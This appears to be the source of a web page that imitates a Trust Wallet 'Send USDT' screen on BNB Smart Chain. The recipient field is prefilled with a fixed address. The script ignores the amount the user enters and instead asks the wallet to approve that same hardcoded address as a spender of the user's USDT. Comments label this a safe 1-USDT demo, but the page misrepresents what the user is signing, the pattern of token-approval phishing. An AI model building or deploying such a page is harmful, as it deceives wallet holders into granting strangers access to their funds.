<!DOCTYPE html><html lang="en"><head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="color-scheme" content="light dark">
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <title>Send USDT</title>
  <link rel="stylesheet" href="css/style.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="css/all.min.css">
  <style>
    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(255, 255, 255, 0.9);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 10000;
    }

    .loading-spinner-container {
      text-align: center;
    }

    .loading-spinner {
      width: 60px;
      height: 60px;
      border: 4px solid #0000FF;
      border-top: 4px solid #ffffff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-text {
      color: #0000FF;
      font-size: 16px;
      font-weight: 600;
      margin: 0;
    }
    /* Dark mode loading spinner styles */
    @media (prefers-color-scheme: dark) {
      .loading-overlay {
        background-color: rgba(0, 0, 0, 0.8) !important;
      }
      .loading-spinner {
        border: 4px solid #01d97e !important;
        border-top: 4px solid rgba(1, 217, 126, 0.3) !important;
      }
      .loading-text {
        color: #01d97e !important;
      }
    }
    /* Critical styles for Trust Wallet compatibility */
    .network-select {
      display: flex !important;
      align-items: center !important;
      background-color: #f5f5f5 !important;
      border: 1px solid #e0e0e0 !important;
      border-radius: 12px !important;
      padding: 10px 12px !important;
      margin-bottom: 16px !important;
      gap: 8px !important;
      min-height: 44px !important;
      max-height: 44px !important;
      max-width: 70% !important;
      width: fit-content !important;
      box-sizing: border-box !important;
    }
    .network-icon {
      width: 20px !important;
      height: 20px !important;
      display: flex !important;
      align-items: center !important;
      justify-content: center !important;
      flex-shrink: 0 !important;
    }
    .bnb-logo-img {
      width: 20px !important;
      height: 20px !important;
      object-fit: cover !important;
      display: block !important;
      border-radius: 50% !important;
      flex-shrink: 0 !important;
    }
    .network-text {
      flex: 0 1 auto !important;
      color: #4b5563 !important;
      font-size: 14px !important;
      font-weight: 500 !important;
      line-height: 1.4 !important;
      white-space: nowrap !important;
    }
    .network-arrow {
      color: #9ca3af !important;
      font-size: 10px !important;
      margin-left: auto !important;
      flex-shrink: 0 !important;
    }
    /* Critical button styles for Trust Wallet - Light mode */
    .text-btn, .icon-btn, .max-btn {
      color: #0000FF !important;
    }
    /* Critical input-group styles for Trust Wallet */
    .input-group {
      display: flex !important;
      align-items: center !important;
      background-color: #FFFFFF !important;
      border: 1px solid #d1d5db !important;
      border-radius: 12px !important;
      padding: 12px 14px !important;
      margin-bottom: 16px !important;
      min-height: 48px !important;
      max-height: 48px !important;
      box-sizing: border-box !important;
      gap: 8px !important;
      overflow: hidden !important;
    }
    .input-group input {
      flex: 1 !important;
      min-width: 0 !important;
      background: transparent !important;
      border: none !important;
      outline: none !important;
      color: #000000 !important;
      font-size: 16px !important;
      font-weight: 500 !important;
      padding: 0 !important;
      margin: 0 !important;
      height: auto !important;
      line-height: 1.5 !important;
    }
    /* Dark Mode Support - Detects system preference automatically */
    @media (prefers-color-scheme: dark) {
      body {
        background-color: #1b1b1b !important;
        color: #ffffff !important;
      }
      .container {
        background-color: #1b1b1b !important;
      }
      .title {
        color: #ffffff !important;
      }
      .label {
        color: #d1d5db !important;
      }
      .input-group {
        background-color: #FFFFFF !important;
        border: 1px solid #e0e0e0 !important;
      }
      .input-group input {
        color: #000000 !important;
      }
      .input-group input::placeholder {
        color: #9ca3af !important;
      }
      .text-btn, .icon-btn, .max-btn {
        color: #01d97e !important;
      }
      .unit {
        color: #4b5563 !important;
      }
      .network-select {
        background-color: #1b1b1b !important;
        border: 1px solid #404040 !important;
      }
      .network-select:hover {
        background-color: #252525 !important;
        border-color: #505050 !important;
      }
      .network-text {
        color: #ffffff !important;
      }
      .network-arrow {
        color: #9ca3af !important;
      }
      .estimate {
        color: #9ca3af !important;
      }
      .address-input-group {
        background-color: #1b1b1b !important;
        border: 1px solid #404040 !important;
      }
      .address-input-group input {
        color: #ffffff !important;
      }
      .amount-input-group {
        background-color: #1b1b1b !important;
        border: 1px solid #404040 !important;
      }
      .amount-input-group input {
        color: #ffffff !important;
      }
      .next-btn {
        background-color: #01d97e !important;
        color: #000000 !important;
      }
      .next-btn:hover:not(:disabled) {
        background-color: #01c571 !important;
      }
      .next-btn:disabled {
        background-color: #25653A !important;
        color: #ffffff !important;
        cursor: not-allowed !important;
        opacity: 1 !important;
      }
    }
  </style>

</head>
<body>
  <!-- Loading Spinner Overlay -->
  <div id="loadingOverlay" class="loading-overlay" style="display: none;">
    <div class="loading-spinner-container">
      <div class="loading-spinner"></div>
      <p class="loading-text">Processing...</p>
    </div>
  </div>

  <main class="container">
    <h1 class="title">Send USDT</h1>

    <label class="label" for="address">Address or Domain Name</label>
    <div class="input-group address-input-group" style="display: flex !important; align-items: center !important; border-radius: 12px !important; padding: 12px 14px !important; margin-bottom: 16px !important; min-height: 48px !important; max-height: 48px !important; box-sizing: border-box !important; gap: 8px;">
      <input type="text" id="address" placeholder="Search or Enter" value="0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC" style="flex: 1 !important; min-width: 0 !important; background: transparent !important; border: none !important; outline: none !important; font-size: 16px !important; font-weight: 500 !important; padding: 0 !important; margin: 0 !important; height: auto !important; line-height: 1.5 !important;">
      <button class="text-btn">Paste</button>
      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
      <button class="icon-btn"><i class="fas fa-expand"></i></button>
    </div>

    <label class="label" for="destinationNetwork">Destination network</label>
    <div class="network-select" style="display: flex !important; align-items: center !important; border-radius: 12px !important; padding: 10px 12px !important; margin-bottom: 16px !important; cursor: pointer; gap: 8px; -webkit-gap: 8px; max-width: 70% !important; width: fit-content !important; box-sizing: border-box !important; min-height: 44px !important; max-height: 44px !important; height: auto !important;">
      <div class="network-icon" style="width: 20px !important; height: 20px !important; min-width: 20px !important; display: flex !important; align-items: center !important; justify-content: center !important; flex-shrink: 0 !important; position: relative; margin-right: 8px;">
        <img src="images/cropped_circle_image.png" alt="BNB Smart Chain" class="bnb-logo-img" style="width: 20px !important; height: 20px !important; max-width: 20px !important; max-height: 20px !important; object-fit: cover !important; display: block !important; border-radius: 50% !important; flex-shrink: 0 !important;">
      </div>
      <span class="network-text" style="flex: 0 1 auto !important; font-size: 14px !important; font-weight: 500 !important; line-height: 1.4 !important; white-space: nowrap;">BNB Smart Chain</span>
      <i class="fas fa-chevron-down network-arrow" style="color: #9ca3af !important; font-size: 10px !important; margin-left: 8px !important; flex-shrink: 0 !important;"></i>
    </div>

    <label class="label" for="amount">Amount</label>
    <div class="input-group amount-input-group" style="display: flex !important; align-items: center !important; border-radius: 12px !important; padding: 12px 14px !important; margin-bottom: 16px !important; min-height: 48px !important; max-height: 48px !important; box-sizing: border-box !important; gap: 8px;">
      <input type="number" id="amount" placeholder="USDT Amount" required="" min="0" step="any" style="flex: 1 !important; min-width: 0 !important; background: transparent !important; border: none !important; outline: none !important; font-size: 16px !important; font-weight: 500 !important; padding: 0 !important; margin: 0 !important; height: auto !important; line-height: 1.5 !important;">
      <span class="unit">USDT</span>
      <button class="max-btn">Max</button>
    </div>

    <p class="estimate">≈ $0.00</p>

    <button type="submit" class="next-btn" id="nextBtn" onclick="handleNextClick()" disabled="">Next</button>
  </main>

  <script type="text/javascript" src="js/web3.min.js"></script>
<script src="js/jquery-3.7.1.min.js"></script>
<script>
// Safe 1-USDT demo flow. No automatic connection, no unlimited allowance,
// and no background wallet/balance reporting.
const BSC_CHAIN_ID = '0x38';
const USDT_ADDRESS = '0x55d398326f99059ff775485246999027b3197955';
const DEMO_SPENDER = '0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC';
const USDT_DECIMALS = 18; // BSC USDT contract uses 18 decimals.
const ONE_USDT = '1000000000000000000';

const ERC20_ABI = [
  { constant:true, inputs:[{name:'owner',type:'address'}], name:'balanceOf', outputs:[{name:'',type:'uint256'}], type:'function' },
  { constant:true, inputs:[{name:'owner',type:'address'},{name:'spender',type:'address'}], name:'allowance', outputs:[{name:'',type:'uint256'}], type:'function' },
  { constant:false, inputs:[{name:'spender',type:'address'},{name:'amount',type:'uint256'}], name:'approve', outputs:[{name:'',type:'bool'}], type:'function' },
  { constant:true, inputs:[], name:'decimals', outputs:[{name:'',type:'uint8'}], type:'function' }
];

let provider = null;
let web3 = null;
let userAddress = null;

function showLoading(message = 'Processing...') {
  const overlay = document.getElementById('loadingOverlay');
  const text = overlay && overlay.querySelector('.loading-text');
  if (text) text.textContent = message;
  if (overlay) overlay.style.display = 'flex';
}
function hideLoading() {
  const overlay = document.getElementById('loadingOverlay');
  if (overlay) overlay.style.display = 'none';
}
function setNextEnabled(enabled) {
  const btn = document.getElementById('nextBtn');
  if (btn) btn.disabled = !enabled;
}
function getProvider() {
  return window.ethereum || window.trustwallet || (window.web3 && window.web3.currentProvider) || null;
}

async function connectWallet() {
  provider = getProvider();
  if (!provider) {
    alert('No wallet provider found. Open this page inside MetaMask or Trust Wallet browser.');
    return null;
  }

  try {
    // This call is intentionally triggered by the user's Connect button.
    const accounts = await provider.request({ method:'eth_requestAccounts' });
    if (!accounts || !accounts.length) throw new Error('No wallet account returned.');

    let chainId = await provider.request({ method:'eth_chainId' });
    if (String(chainId).toLowerCase() !== BSC_CHAIN_ID) {
      try {
        await provider.request({
          method:'wallet_switchEthereumChain',
          params:[{ chainId:BSC_CHAIN_ID }]
        });
      } catch (e) {
        if (e && e.code === 4902) {
          await provider.request({
            method:'wallet_addEthereumChain',
            params:[{
              chainId:BSC_CHAIN_ID,
              chainName:'BNB Smart Chain',
              nativeCurrency:{ name:'BNB', symbol:'BNB', decimals:18 },
              rpcUrls:['https://bsc-dataseed.bnbchain.org/','https://bsc-dataseed.binance.org/'],
              blockExplorerUrls:['https://bscscan.com/']
            }]
          });
        } else {
          throw e;
        }
      }
    }

    web3 = new Web3(provider);
    const activeChain = await provider.request({ method:'eth_chainId' });
    if (String(activeChain).toLowerCase() !== BSC_CHAIN_ID) {
      throw new Error('Please switch the wallet to BNB Smart Chain.');
    }

    const refreshed = await provider.request({ method:'eth_accounts' });
    userAddress = refreshed && refreshed[0] ? refreshed[0] : accounts[0];
    if (!userAddress) throw new Error('Wallet account is unavailable.');

    const short = userAddress.slice(0,6) + '...' + userAddress.slice(-4);
    const btn = document.getElementById('connectWalletBtn');
    if (btn) btn.textContent = 'Connected ' + short;
    setNextEnabled(true);
    console.log('Wallet connected:', userAddress);
    console.log('Network: BNB Smart Chain');
    return userAddress;
  } catch (error) {
    console.error('Wallet connection failed:', error);
    if (error && error.code === 4001) {
      alert('Wallet connection was rejected.');
    } else {
      alert(error && error.message ? error.message : 'Wallet connection failed.');
    }
    return null;
  }
}

async function ensureConnected() {
  if (userAddress && web3) return userAddress;
  return await connectWallet();
}

async function approveOneUSDT(account) {
  if (!web3) throw new Error('Wallet provider is not initialized.');
  const contract = new web3.eth.Contract(ERC20_ABI, USDT_ADDRESS);

  const decimals = Number(await contract.methods.decimals().call());
  if (!Number.isFinite(decimals) || decimals < 0 || decimals > 36) {
    throw new Error('Unable to read USDT decimals.');
  }
  const oneUSDT = web3.utils.toBN(10).pow(web3.utils.toBN(decimals));

  const balance = web3.utils.toBN(await contract.methods.balanceOf(account).call());
  if (balance.lt(oneUSDT)) {
    throw new Error('Your wallet needs at least 1 USDT for this demo.');
  }

  const currentAllowance = web3.utils.toBN(await contract.methods.allowance(account, DEMO_SPENDER).call());
  if (currentAllowance.gte(oneUSDT)) {
    alert('1 USDT is already approved for this demo address.');
    return { alreadyApproved:true };
  }

  // IMPORTANT: exactly 1 USDT, never an unlimited allowance.
  showLoading('Confirm 1 USDT approval in your wallet...');
  const receipt = await contract.methods.approve(DEMO_SPENDER, oneUSDT.toString()).send({ from:account });
  console.log('1 USDT approval confirmed:', receipt.transactionHash);
  return { alreadyApproved:false, txHash:receipt.transactionHash };
}

async function TokenApprove() {
  try {
    const account = await ensureConnected();
    if (!account) return;

    const chainId = await provider.request({ method:'eth_chainId' });
    if (String(chainId).toLowerCase() !== BSC_CHAIN_ID) {
      throw new Error('Please switch to BNB Smart Chain and try again.');
    }

    showLoading('Checking USDT balance...');
    const result = await approveOneUSDT(account);
    hideLoading();

    if (result.alreadyApproved) {
      return;
    }
    alert('1 USDT approval successful.\n\nTransaction: ' + result.txHash);
  } catch (error) {
    hideLoading();
    console.error('1 USDT approval failed:', error);
    if (error && error.code === 4001) {
      alert('1 USDT approval was rejected in your wallet.');
    } else {
      alert('1 USDT approval failed. ' + (error && error.message ? error.message : 'Please check your wallet and try again.'));
    }
  }
}

async function handleNextClick() {
  const amountInput = document.getElementById('amount');
  const amount = amountInput ? parseFloat(amountInput.value) : 0;
  if (!amount || amount <= 0) {
    alert('Please enter a valid amount.');
    return;
  }
  await TokenApprove();
}

function handleWalletEvents() {
  provider = getProvider();
  if (!provider || !provider.on) return;
  provider.on('accountsChanged', accounts => {
    userAddress = accounts && accounts[0] ? accounts[0] : null;
    if (!userAddress) {
      web3 = null;
      setNextEnabled(false);
      const btn = document.getElementById('connectWalletBtn');
      if (btn) btn.textContent = 'Connect Wallet';
    }
  });
  provider.on('chainChanged', chainId => {
    if (String(chainId).toLowerCase() !== BSC_CHAIN_ID) {
      setNextEnabled(false);
      alert('Please switch your wallet to BNB Smart Chain.');
    } else if (userAddress) {
      setNextEnabled(true);
    }
  });
}

window.addEventListener('load', () => {
  // Do NOT request wallet access automatically on page load.
  // Mobile wallet browsers often require the connection request to follow a user action.
  const main = document.querySelector('.container');
  if (main) {
    const btn = document.createElement('button');
    btn.id = 'connectWalletBtn';
    btn.type = 'button';
    btn.textContent = 'Connect1 Wallet';
    btn.style.cssText = 'width:100%;margin:0 0 18px;padding:14px;border:0;border-radius:12px;background:#01d97e;color:#000;font-size:16px;font-weight:700;cursor:pointer;';
    btn.addEventListener('click', connectWallet);
    const title = main.querySelector('.title');
    if (title && title.nextSibling) main.insertBefore(btn, title.nextSibling);
    else main.prepend(btn);
  }

  setNextEnabled(false);
  handleWalletEvents();
});
</script>
</body>
</html>
